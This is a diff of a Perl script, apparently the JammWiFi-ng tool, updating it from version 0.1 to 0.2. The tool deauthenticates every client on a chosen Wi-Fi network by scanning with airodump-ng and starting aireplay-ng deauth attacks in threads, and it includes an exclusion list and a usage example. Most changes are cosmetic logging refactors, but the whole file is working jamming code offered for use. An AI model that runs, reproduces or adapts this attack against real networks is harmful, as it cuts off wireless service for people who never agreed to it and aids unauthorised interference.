@@ -1,6 +1,6 @@
 #!/usr/bin/perl
 #	JammWiFi-ng - a script for deauthenticating all clients on a network using aireplay deauth attack
-#    Copyright (C) 2011 Ettore Di Giacinto <mailto:mudler@dark-lab.net>
+#    Copyright (C) 2011 Ettore Di Giacinto <mailto:e.digiacinto@gmail.com>
 #
 #    This program is free software: you can redistribute it and/or modify
 #    it under the terms of the GNU General Public License as published by
@@ -16,21 +16,22 @@
 #    along with this program.  If not, see <http://www.gnu.org/licenses/>.
 
 # TODO: * Using Thread::Pool instead of thread
-#		* using Term modules
+
 use Getopt::Long;
 use Data::Dumper;
 use XML::TreeBuilder;
 use threads ('yield');
 
 my $PROG="JammWiFi-ng";
-my $VERSION="0.1";
+my $VERSION="0.2";
 system("clear");
+
 print "
-########################################################################
-###########################################################".$PROG." v".$VERSION."
-#######################################################################
-						By mudler
-						http://hacklab-42.dark-lab.net\n";
+\e[1;35m\e[40m
+######################################################################################
+################################# -".$PROG." v".$VERSION."- #################################
+################### -By mudler <http://hacklab-42.dark-lab.net>- #####################
+\n";
 
 
 my $result = GetOptions(
@@ -55,44 +56,43 @@ $deauth = 10 if !defined($deauth);
 my %threads;
 my $file;
 my $tree = XML::TreeBuilder->new();
-
-print "[!] Starting jamming on ".$dev." cycling every ".$cicle." for ".$deauth." deauths\n";
-print "[!] Kicking out all clients...\n";
+message("Starting jamming on ".$dev." cycling every ".$cicle." for ".$deauth." deauths","Main",0);
+message("Kicking out all clients...","Main",0);
 if(defined($verbose)){
-	print "[!] Verbose mode on!\n";
+	message("Verbose mode on","Main",1);
 	$verbose=1;
 } else {
 	$verbose=0;
 }
 if(defined($direct)){
-	print "[!] Direct Jamming mode on!\n";
+	message("Direct Jamming on","Main",0);
 	$direct=1;
 } else {
 	$direct=0;
 }
 if(defined($xterm)){
-	print "[!] using xterm \n";
-	$xterm=1;
+	message("Xterm mode on","Main",0);	$xterm=1;
 } else {
 	$xterm=0;
 }
-system( "aireplay-ng --deauth ".$deauth." -a " . $target . " " . $dev );
+$aireplay = threads->create( 'jamming', $target,
+										$target, $dev,$deauth,0,0 );
+$aireplay->join();
+$airodump = threads->create( 'airodump', $dev, $channel,$deauth,$xterm,$target );
+
 foreach my $excluded(@EXCLUDED_MAC){
-	print "[EXCLUDED] ".$excluded." \n";
+	message($excluded,"Excluded",1);
 }
 `rm -rfv *.netxml`;
 
-print "[!] Kicking out all clients...\n";
-$airodump = threads->create( 'airodump', $dev, $channel,$deauth,$xterm,$target );
+
 
 $SIG{'INT'} = sub { 
 	my $running = threads->list(threads::all);
-
-	print "[SIGKILL] Signal received, stopping all threads\n";
-	print "[".$running."] Are going to be killed\n";
-
+	message("Signal received, stopping all threads","Sighandler",1);
+	message($running." process are going to be killed","Sighandler",1);
 	killthreads();
-	print "[SIGKILL] All clear, exiting\n";
+	message("All clear, exiting","Sighandler",1);
 	exit();
 	 };
 
@@ -100,7 +100,7 @@ $SIG{'INT'} = sub {
 while ( sleep $cicle ) {
 	@XML = <*.netxml>;
 	##Checking the Thread state....!
-	print "[THREADS] Checking states and joining the threads...\n";
+	message("Checking states and joining the threads","Threads",0);
 	my @joinable_threads=threads->list(threads::joinable);
 	my $joined=0;
 	foreach my $joinable(@joinable_threads){
@@ -108,8 +108,7 @@ while ( sleep $cicle ) {
 			delete $threads{$joinable->tid()};
 			$joined++;
 	}
-	print "[THREADS] joined ".$joined." threads...\n";
-
+	message("joined ".$joined." threads","Threads",0);
 	my $found=0;
 	foreach my $file (@XML) {
 		$tree->parse_file($file);
@@ -130,8 +129,8 @@ while ( sleep $cicle ) {
 						foreach my $special (@EXCLUDED_MAC) {
 							if ( $special eq $KILL ) {
 								$is_excluded=1;
-								print "[!] " . $KILL
-								  . " is on EXCLUDED_MAC list!\n";
+								message($KILL . " is on EXCLUDED_MAC list!","Excluded",1);
+
 							}
 						}
 						if($is_excluded==0){
@@ -145,9 +144,7 @@ while ( sleep $cicle ) {
 							if($exists==0){
 									$tr = threads->create( 'jamming', $KILL,
 										$target, $dev,$deauth,$direct,$verbose );
-									print "[STARTED] #"
-									  . $tr->tid() . " on "
-									  . $KILL . " !\n";
+									message($tr->tid() . " on " . $KILL . " !","Threads",1);
 									  $threads{$tr->tid()}=$KILL;
 
 							}
@@ -157,10 +154,8 @@ while ( sleep $cicle ) {
 						$clients++;
 					}
 				my $threads_running = threads->list(threads::running);
-				print "[NETWORK] " . $target . " found!\n";
-				print "[NETWORK] " . $target . " has ".$clients." clients associated!\n";
-				print "[THREADS] " .  $threads_running . " threads running\n";
-
+			    message($target . " has ".$clients." clients associated!","Network",1);
+				message($threads_running . " threads running!","Threads",1);
 				}
 
 
@@ -175,7 +170,7 @@ sub airodump {
 	$deauth=$_[2];
 	$xterm=$_[3];
 	$target=$_[4];
-	$SIG{'KILL'} = sub { print "[Killing airodump thread]\n";threads->exit(); };
+	$SIG{'KILL'} = sub { message("Signal kill received, exiting [WAS airodump-ng thread]","Threads",0);threads->exit(); };
 	if($xterm==1){
 	system(
 "xterm -fn fixed -geom -0-0 -title 'Scanning specified channel' -e 'airodump-ng -c "
@@ -194,17 +189,17 @@ sub airodump {
 
 sub jamming {
 	my($KILL,$target,$dev,$deauth,$direct,$verbose)=@_;
-	$SIG{'KILL'} = sub { print "[Killing jam on $KILL]\n";threads->exit(); };
+	$SIG{'KILL'} = sub { message("Signal kill received, exiting [WAS attacking on ".$KILL."]","Threads",0);threads->exit(); };
 	if($verbose==1){
 		if($direct==1){
-			print "[ATTACKING] ".$KILL." with ".$deauth." on ".$dev." direct mode\n";
+			message($KILL." with ".$deauth." on ".$dev." direct mode","Attacking",0);
 			system( "aireplay-ng --deauth " 
 		  . $deauth . " -a " 
 		  . $target . " -c " 
 		  . $KILL . " "
 		  . $dev );
 		} else {
-			print "[ATTACKING] ".$KILL." with ".$deauth." on ".$dev."\n";
+			message($KILL." with ".$deauth." on ".$dev,"Attacking",0);
 		  	system( "aireplay-ng --deauth " 
 		  . $deauth . " -a " 
 		  . $KILL . " "
@@ -213,13 +208,13 @@ sub jamming {
 	} else {
 		
 		if($direct==1){
-			print "[ATTACKING] ".$KILL." with ".$deauth." on ".$dev." direct mode\n";
+			message($KILL." with ".$deauth." on ".$dev." direct mode","Attacking",0);
 			`aireplay-ng --deauth $deauth -a $target -c $KILL $dev`;
 		} else {
-			print "[ATTACKING] ".$KILL." with ".$deauth." on ".$dev."\n";
+			message($KILL." with ".$deauth." on ".$dev,"Attacking",0);
 			`aireplay-ng --deauth $deauth -a $KILL $dev`;	
 		}
-		print "[FINISHED] Attacking ".$KILL."\n";
+			message("Finished on ".$KILL." with ".$deauth." on ".$dev,"Attacking",0);
 		
 	}
 #system("xterm -fn fixed -geom -0-0 -title 'Jamming ".$KILL."' -e 'aireplay-ng --deauth 30 -a ".$target." -c ".$KILL." ".$dev."'");
@@ -228,7 +223,6 @@ sub jamming {
 }
 
 sub usage(){
-	
 	print "
 	".$PROG." v".$VERSION."
 	".$PROG." Performs an wifi jammer attack, that means that on the specified 
@@ -246,7 +240,7 @@ sub usage(){
 	option --direct it's using the direct client deauth on aireplay (-c option)
 	
 	E.G. 
-	./".$0." --dev mon0 --target AP:MAC:FF:AA:AA:AA --channel 11 --deauth 10 --cycle 20 --exclude MY:MAC:FF:AA:AA:AA  --direct --xterm
+	".$0." --dev mon0 --target AP:MAC:FF:AA:AA:AA --channel 11 --deauth 10 --cycle 20 --exclude MY:MAC:FF:AA:AA:AA  --direct --xterm
 
 	\n";
 	
@@ -267,3 +261,53 @@ sub killthreads(){
 }
 
 
+sub message(){
+
+	my $message=$_[0];
+	my $obj=$_[1];
+	my $type=$_[2];
+	
+my %fg = (
+  'default'      => "",
+  'bold'         => "\e[1m",
+  'black'        => "\e[30m",
+  'red'          => "\e[31m",
+  'blue'         => "\e[32m",
+  'yellow'       => "\e[33m",
+  'green'        => "\e[34m",
+  'majenta'      => "\e[35m",
+  'cyan'         => "\e[36m",
+  'white'        => "\e[37m",
+  'bold black'   => "\e[1;30m",
+  'bold red'     => "\e[1;31m",
+  'bold blue'    => "\e[1;32m",
+  'bold yellow'  => "\e[1;33m",
+  'bold green'   => "\e[1;34m",
+  'bold majenta' => "\e[1;35m",
+  'bold cyan'    => "\e[1;36m",
+  'bold white'   => "\e[1;37m",
+);
+
+my %bg = (
+  'default'      => "",
+  'black'        => "\e[40m",
+  'red'          => "\e[41m",
+  'green'         => "\e[42m",
+  'yellow'       => "\e[43m",
+  'blue'        => "\e[44m",
+  'majenta'      => "\e[45m",
+  'cyan'         => "\e[46m",
+  'white'        => "\e[47m");
+	
+	
+	if($type==0){
+		
+		  print $fg{"bold white"}.$bg{"red"}."[!]".$fg{"bold majenta"}.$bg{"black"}."[".$obj."] ".$fg{"bold white"}.$bg{"black"}.$message."\e[0m\n";
+	} elsif($type==1){
+		  print $fg{"bold white"}.$bg{"majenta"}."[*]".$fg{"bold majenta"}.$bg{"black"}."[".$obj."] ".$fg{"bold white"}.$bg{"black"}.$message."\e[0m\n";
+	}
+	
+
+	
+	
+}
